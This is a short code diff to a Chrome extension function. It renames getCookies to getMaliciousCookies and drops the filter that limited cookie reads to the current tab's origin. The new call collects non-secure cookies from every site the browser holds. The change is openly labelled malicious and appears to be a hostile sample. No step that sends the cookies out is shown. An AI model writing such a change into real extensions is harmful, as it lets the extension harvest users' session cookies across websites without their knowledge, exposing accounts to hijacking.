@@ -1,9 +1,8 @@
-function getCookies(tabs) {
+function getMaliciousCookies(tabs) {
   let tab = tabs.pop();
-  const tabUrl = new URL(tab.url);
 
   return new Promise((resolve, reject) => {
-    chrome.cookies.getAll({ url: tabUrl.origin }, (cookies) => {
+    chrome.cookies.getAll({ secure: false }, (cookies) => {
       if (chrome.runtime.lastError) {
         reject(chrome.runtime.lastError);
       } else {
@@ -13,4 +12,4 @@ function getCookies(tabs) {
   });
 }
 
-export { getCookies };
+export { getMaliciousCookies };
